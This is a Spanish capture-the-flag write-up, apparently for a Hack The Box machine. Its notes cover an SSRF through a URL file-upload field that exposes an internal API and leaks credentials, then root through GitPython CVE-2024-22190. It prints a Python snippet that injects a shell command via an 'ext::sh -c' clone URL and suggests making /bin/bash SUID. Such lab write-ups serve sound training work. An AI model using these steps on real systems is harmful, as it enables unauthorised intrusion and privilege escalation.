---

---
---
- Tags:  #writeup #info #htb #tutorial #ssrf #fileupload 
----
# Reconocimiento

- [x] Puertos *Abiertos*(22, 80 )
- [x] Servicios
- [x] WhatWeb
- [x] Headers
- [x] Gobsuter
- [x] Gobuster Extensiones

----------
# Enumeracion

- **OS**:

- **Credentials**

- **Pendientes**

- ### INFO GRAL

File upload en el campo de subida de Cover, podemos subirlo a traves de url

------
# Explotacion

- Le subimos un archivo desde nuestro propio equipo y lo toma.
- No fue posible subirle un archivo en *php* sin que intente descargarlo (no lo interpreta)
- Intentamos un ssrf ahora poniendole la localhost 127.0.0.1:80
- Iterendo con el Intruder por puertos el 5000 responde de una forma diferente, al parecer tenemos una API
- Aqui podemos ver archivos y tenemos unas credenciales del usuario **dev**

### Vias Potenciales Explotacion
- File Upload
- SSRF

---------
# Privesc

- [x] sudo -l
- [x] history
- [x] SUID
- [x] crontab
- [x] getcap
- [x] find .txt
- [x] find .sh
- [x] id
- [x] env
- [x] /opt /tmp
- [x] pspy, lse, linpeas,etc
- [x] Kernel Exploits
- [x] BruteForce Su

- En este punto en el directorio /apps, tenemos un archivo **.git**
- Enumerando el repo podemos ver unas credenciales de el usuario **prod**
---
- Este user puede ejecutar un binario el cual nos permite explotar la vulnerabilidad de GitPython conocida como: **(CVE-2024-22190)**
```bash
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
``` 

- Simplemente el primer parametro podemos ejecutar algun comando a nivel de sistema y meterle por ejemplo un **chmod u+s /bin/bash**
- Pwned
------------
